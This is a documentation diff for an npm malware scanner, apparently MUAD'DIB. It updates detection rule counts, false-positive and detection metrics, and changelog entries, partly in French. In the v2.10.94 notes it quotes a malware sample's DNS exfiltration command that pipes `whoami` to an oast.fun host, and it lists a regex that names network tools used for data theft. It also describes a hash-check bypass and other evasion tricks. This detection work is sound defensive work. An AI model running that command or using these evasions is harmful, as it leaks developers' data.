@@ -28,13 +28,13 @@ bin/muaddib.js (yargs CLI)
         ├─► Deduplication
         ├─► FP reductions (src/scoring.js — applyFPReductions)
         ├─► Intent coherence analysis (src/intent-graph.js — buildIntentPairs)
-        ├─► Rule enrichment (src/rules/index.js — 207 rules)
+        ├─► Rule enrichment (src/rules/index.js — 209 rules)
         ├─► Scoring (src/scoring.js — per-file max)
         ├─► ML classifier (src/ml/classifier.js — T1 zone filtering)
         └─► Output (CLI / JSON / HTML / SARIF)
 ```
 
-**Core orchestration:** `src/index.js` — `run(targetPath, options)` runs cross-file module graph analysis first, then launches 13 individual scanners in parallel via `Promise.all` (14 scanner modules total), then deduplicates, applies FP reductions, scores using per-file max (v2.2.11: `riskScore = min(100, max(file_scores) + package_level_score)`, severity weights: CRITICAL=25, HIGH=10, MEDIUM=3, LOW=1), applies intent coherence analysis (intra-file source-sink pairing), enriches with rules/playbooks (207 rules), and outputs (CLI/JSON/HTML/SARIF). Result includes `warnings: []` array (v2.6.5) for incomplete scan notifications (module graph timeout/skip, deobfuscation failures). Exports `isPackageLevelThreat` and `computeGroupScore` for testing.
+**Core orchestration:** `src/index.js` — `run(targetPath, options)` runs cross-file module graph analysis first, then launches 13 individual scanners in parallel via `Promise.all` (14 scanner modules total), then deduplicates, applies FP reductions, scores using per-file max (v2.2.11: `riskScore = min(100, max(file_scores) + package_level_score)`, severity weights: CRITICAL=25, HIGH=10, MEDIUM=3, LOW=1), applies intent coherence analysis (intra-file source-sink pairing), enriches with rules/playbooks (209 rules), and outputs (CLI/JSON/HTML/SARIF). Result includes `warnings: []` array (v2.6.5) for incomplete scan notifications (module graph timeout/skip, deobfuscation failures). Exports `isPackageLevelThreat` and `computeGroupScore` for testing.
 
 ## Scanner Modules
 
@@ -113,9 +113,9 @@ Replaces global score accumulation with per-file max scoring. Formula: `riskScor
 
 ## Evaluation Framework
 
-**Evaluation Framework (v2.2, corrected v2.2.7, updated through v2.9.4):** `src/commands/evaluate.js` measures TPR (Ground Truth, 49 real attacks from 51 samples), FPR (Benign, 529 npm packages — real source code via `npm pack` + native tar extraction), and ADR (Adversarial + Holdout, 107 evasive samples — 67 adversarial + 40 holdout). Benign tarballs cached in `.muaddib-cache/benign-tarballs/`. Flags: `--benign-limit N`, `--refresh-benign`. Results saved to `metrics/v{version}.json`.
+**Evaluation Framework (v2.2, corrected v2.2.7, updated through v2.10.95):** `src/commands/evaluate.js` measures TPR (Ground Truth, 65 active real attacks from 67 samples; 2 out-of-scope GT-005/GT-009 protestware with min_threats=0), FPR (Benign, 548 npm curated packages — real source code via `npm pack` + native tar extraction), and ADR (Adversarial + Holdout, 107 evasive samples — 67 adversarial + 40 holdout). Benign tarballs cached in `.muaddib-cache/benign-tarballs/`. Flags: `--benign-limit N`, `--refresh-benign`. Results saved to `metrics/v{version}.json`.
 
-**FPR progression:** 0% (invalid, v2.2.0–v2.2.6) → 38% (v2.2.7) → 19.4% (v2.2.8) → 17.5% (v2.2.9) → ~13% (69/527, v2.2.11) → 8.9% (47/527, v2.3.0) → 7.4% (39/525, v2.3.1) → 6.0% (32/529, v2.5.8, included BENIGN_PACKAGE_WHITELIST bias) → ~13.6% (72/529, v2.5.14, audit hardening + whitelist removed in v2.5.10) → 12.3% (65/529, v2.5.16, P5+P6) → 12.1% (64/529, v2.6.2, P7) → 12.9% (68/529, v2.9.4, compound scoring + new rules) → **10.8%** (57/529, v2.10.1, audit v3 FP reduction) → **14.0%** (74/532, v2.10.57, curated benign corpus rebuild) → **estimated 6-9%** (v2.10.74, P1-P4 FP cluster fixes — bundle path regex extension + TIER1 guard + quick-scan degrade + WASM skip, measurement deferred to post-release sweep).
+**FPR progression:** 0% (invalid, v2.2.0–v2.2.6) → 38% (v2.2.7) → 19.4% (v2.2.8) → 17.5% (v2.2.9) → ~13% (69/527, v2.2.11) → 8.9% (47/527, v2.3.0) → 7.4% (39/525, v2.3.1) → 6.0% (32/529, v2.5.8, included BENIGN_PACKAGE_WHITELIST bias) → ~13.6% (72/529, v2.5.14, audit hardening + whitelist removed in v2.5.10) → 12.3% (65/529, v2.5.16, P5+P6) → 12.1% (64/529, v2.6.2, P7) → 12.9% (68/529, v2.9.4, compound scoring + new rules) → **10.8%** (57/529, v2.10.1, audit v3 FP reduction) → **14.0%** (74/532, v2.10.57, curated benign corpus rebuild) → **estimated 6-9%** (v2.10.74, P1-P4 FP cluster fixes — projected gain) → **15.6% measured** (85/545 scanned of 548, v2.10.95 metrics file — the v2.10.74 projected reduction did NOT materialize on the rebuilt corpus) → **post-filtre F1-F7 contextual FP caps** (v2.10.97, validated on a separate 302-package human-only corpus: 67/198 FP capped = 33.8 % reduction on that subset, 0/104 malware impacted; full re-measurement on 548 corpus pending).
 
 **Datasets:**
 - Adversarial samples in `datasets/adversarial/` (67 samples)
@@ -126,7 +126,7 @@ Replaces global score accumulation with per-file max scoring. Formula: `riskScor
 
 ### Ground Truth Expansion (v2.2.12)
 
-51 real-world attack samples in `tests/ground-truth/` (49 active, 2 with min_threats=0). TPR: **93.9% (46/49)** as of v2.9.4. 3 out-of-scope misses: lottie-player, polyfill-io, trojanized-jquery (browser-only). ADR: 107 samples (67 adversarial + 40 holdout). ADR: **96.3% (103/107 available)** as of v2.9.4.
+67 real-world attack samples in `tests/ground-truth/` (65 active, 2 with min_threats=0: GT-005 colors and GT-009 faker, both protestware). TPR@3: **93.85% (61/65)** as of v2.10.95 (canonical metrics file). TPR@20: **86.2% (56/65)**. 4 active misses include the 3 browser-only attacks (lottie-player, polyfill-io, trojanized-jquery) plus 1 other. ADR: 107 samples (67 adversarial + 40 holdout). ADR: **96.3% (103/107 available)** as of v2.10.95.
 
 ## Monitor
 
@@ -175,12 +175,12 @@ See [Intent Graph](#intent-graph) section for `isSDKPattern()` details and 22 SD
 - `src/shared/constants.js` — Centralized NPM_PACKAGE_REGEX, MAX_TARBALL_SIZE, DOWNLOAD_TIMEOUT
 
 **Validation & Observability (v2.1):** Features for measuring and validating scanner effectiveness:
-- `src/ground-truth.js` — Ground truth dataset: 51 real-world attacks (49 active) replayed against scanner. 93.9% TPR (46/49).
+- `src/ground-truth.js` — Ground truth dataset: 67 real-world attacks (65 active, 2 protestware with min_threats=0) replayed against scanner. 93.85% TPR@3 (61/65) as of v2.10.95.
 - `--breakdown` flag — Explainable score decomposition showing per-finding contribution
 
 ## Detection Rules
 
-**Rules & playbooks:** Threat types map to rules in `src/rules/index.js` (207 rules: 202 RULES + 5 PARANOID, MITRE ATT&CK mapped) and remediation text in `src/response/playbooks.js`. Both keyed by threat `type` string.
+**Rules & playbooks:** Threat types map to rules in `src/rules/index.js` (209 rules: 204 RULES + 5 PARANOID, MITRE ATT&CK mapped) and remediation text in `src/response/playbooks.js`. Both keyed by threat `type` string.
 
 ### AST Detection Rules (v2.2+)
 
@@ -279,6 +279,48 @@ GlassWorm campaign (March 2026, 433+ packages): Unicode invisible characters + B
 - **AST-056**: `module_load_bypass` — Module._load() internal loader bypass (CRITICAL, T1059.007)
 
 ## Version History
+
+### v2.10.97 — Contextual FP post-filter (F1-F7) in scoring.js
+
+- New `applyContextualFPCaps()` in `src/scoring.js` (lines 1036-1119), called after `calculateRiskScore()` so compound boosts and lifecycle floors keep the last word.
+- 7 deterministic caps wired on the 7 active features from `feature-extractor.js` (F8 still disabled, see v2.10.96):
+  - F1 `bundle_without_install_scripts` → cap 30
+  - F2 `install_url_github_releases` → cap 35
+  - F3 `network_destination_first_party` → cap 30
+  - F4 `git_hook_source_local` → cap 35
+  - F5 `typosquat_scoped_package` → subtract typosquat points (no cap)
+  - F6 `obfuscation_without_vector` → cap 35
+  - F7 `placeholder_anti_dep_confusion` → cap 20
+- When several caps apply, `Math.min()` wins (tightest cap). F5 always applies separately.
+- Validated on 302-package human-reviewed corpus (198 FP + 104 malware): **67/198 FP capped (33.8 %)**, **0/104 malware impacted**. The 131 remaining FP CRITICAL packages don't match any of the 7 clusters and need a different approach (compound scoring dedup roadmap).
+- Tests: 3258 → **3280** passed, 0 failed. Positive + negative tests for each of the 7 caps + composition test (F1+F3 simultaneously → cap = min(30, 30) = 30) + regression test on 67 adversarial samples (zero cap applied).
+- Monitor emits `summary.contextualCaps[]` field listing applied caps.
+
+### v2.10.96 — 8 ML contextual features (F1-F8) + plumbing
+
+- 8 boolean contextual features added to `src/ml/feature-extractor.js` (lines 691-704). Each maps to a known FP cluster identified during the security review v2.10.93-95.
+- F1-F7 active and computed at every scan, F8 (`install_script_no_network_egress`) volontairement laissee inerte (`= 0`) car `EGRESS_TYPES` ne couvre pas `dangerous_exec`/`lifecycle_dangerous_exec`/`node_inline_exec` et fire sur des malwares confirmes. A re-activer apres fix de `EGRESS_TYPES`.
+- Plumbing: `src/scanner/npm-registry.js` extracts `homepage` from manifest (needed for F3), `src/scanner/ast-detectors/handle-post-walk.js` adds `threat.urls[]` (host extracted from each detected URL), `src/scanner/ast.js` passes context to post-walk handler, `src/pipeline/processor.js` propagates `fileSizes` + `homepage` + `threat.urls` to ML record builder, `src/monitor/ingestion.js` mirrors the same plumbing for the monitor.
+- **Aucun changement de scoring, aucun changement de detection** (pure plomberie). Les scans v2.10.96 produisent les memes scores que v2.10.95.
+- Tests: 3236 → **3258** passed, 0 failed. 22 nouveaux tests dans `tests/unit/ml-feature-extractor.test.js` couvrant les 7 features actives (positif/negatif/edge cases).
+
+### v2.10.95 — Hash gate hardening + Windows EPERM fix
+
+- `src/scanner/ast.js:211` : `hasHashVerification` heuristique durcie. Exige maintenant la presence d'un operateur de comparaison (`===`, `!==`, `.equals(`, `assert.strictEqual/equal/deepEqual/deepStrictEqual`, `throw`) en plus de `createHash + digest`. Bypass a 3 lignes ferme : un attaquant ne peut plus declencher le downgrade CRITICAL→HIGH de `download_exec_binary` avec juste `crypto.createHash('sha256').update(buf).digest('hex')` sans comparaison.
+- `src/commands/evaluate.js` : 8 occurrences de `fs.rmSync(pkgCacheDir, ...)` enveloppees dans try/catch silencieux + 3 boucles `evaluateBenign`/`evaluateBenignPyPI`/`evaluateBenignRandom` wrappent `downloadAndExtract` + `silentScan` en try/catch. Un cleanup qui rate sur Windows (EPERM, file lock) ne tue plus une eval de 545 packages.
+- **Triple-gate downgrade CRITICAL→MEDIUM abandonne** : un plan initial proposait un downgrade quand `download_exec_binary` co-occurre avec `hasHashVerification=true` ET `fetchOnlySafeDomains=true`. Diagnostic empirique sur 545 packages benign curated : **0 FPR delta** (15.60 % → 15.60 %). La rule fire sur 3 packages seulement (esbuild, yarn, @backstage/create-app), les 2 derniers etaient deja LOW, esbuild est domine par d'autres rules CRITICAL. Plan archive dans `data/fp-v2.10.95-validation.md` (gitignored).
+- Tests: 3232 → **3236** passed, 0 failed. 4 nouveaux tests `download_exec_binary` (hash sans comparaison → CRITICAL nouveau gate, hash avec comparaison → HIGH preserve, etc.).
+
+### v2.10.94 — Under-threshold malware fixes (4 scoped patches)
+
+Apres v2.10.93 qui ajoutait les rules ltidi/csec/OAST/self_destruct_eval, un rescan empirique sur les tarballs reels de la semaine 2026-04-10 a 04-17 a mesure les scores effectifs et identifie 4 gaps restants :
+
+- `src/scanner/package.js` — nouveau threat type `external_tarball_dep` (CRITICAL) emis a la place de `dependency_url_suspicious` quand l'URL pointe vers une tarball (.tgz/.tar.gz/.tar.bz2/.zip) sur un host non-allowlist (cloud storage, CDN random). Ajoute a `HIGH_CONFIDENCE_MALICE_TYPES` pour bypass le MT-1 score ceiling. Rule ID : `MUADDIB-PKG-020`.
+- `src/scanner/ast-detectors/handle-new-expression.js` — nouveau threat type `function_runtime_args` (CRITICAL) emis quand `new Function()` recoit >= 2 args literal runtime (`require`, `__dirname`, `__filename`, `module`, `exports`, `process`) + body dynamique + obfuscation dans le meme fichier. Le gating obfuscation evite les FP sur les wrappers CommonJS legitimes (babel-register, ts-node, pirates, jest, nyc, vitest). Rule ID : `MUADDIB-AST-090`.
+- `src/scanner/package.js` — `curl_env_exfil` etend son regex pour inclure `ping|nslookup|dig|host|getent`, catchant koa-v3 qui utilise `ping -c 1 $(whoami).<hex>.oast.fun`.
+- `src/scoring.js` — nouveau floor a 75 quand 2+ threat types DISTINCTS sont CRITICAL package-level. Co-occurrence 2 CRITICAL package-level = signature quasi-certaine de malware.
+
+Rescan empirique v2.10.93 → v2.10.94 : ltidi cmp-api-stub 35 → 50, csec-crypto-toolkit 19 → **88**, apache-arrow-14 50 → 75, koa-v3 9 → 75. Tests: 3230 → **3232** passed, 0 failed. 2 nouveaux tests `function_runtime_args`. Rules: 207 → **209** (204 RULES + 5 PARANOID).
 
 ### v2.10.93 — Security review 2026-04-10 to 04-17 : ltidi + csec + OAST remediation
 - Review manuelle de 22 858 tarballs sur 8 jours, 37 malwares confirmés dont 10 sous le seuil de triage (ADR_THRESHOLD=20). Deux campagnes bypassaient entièrement la détection :
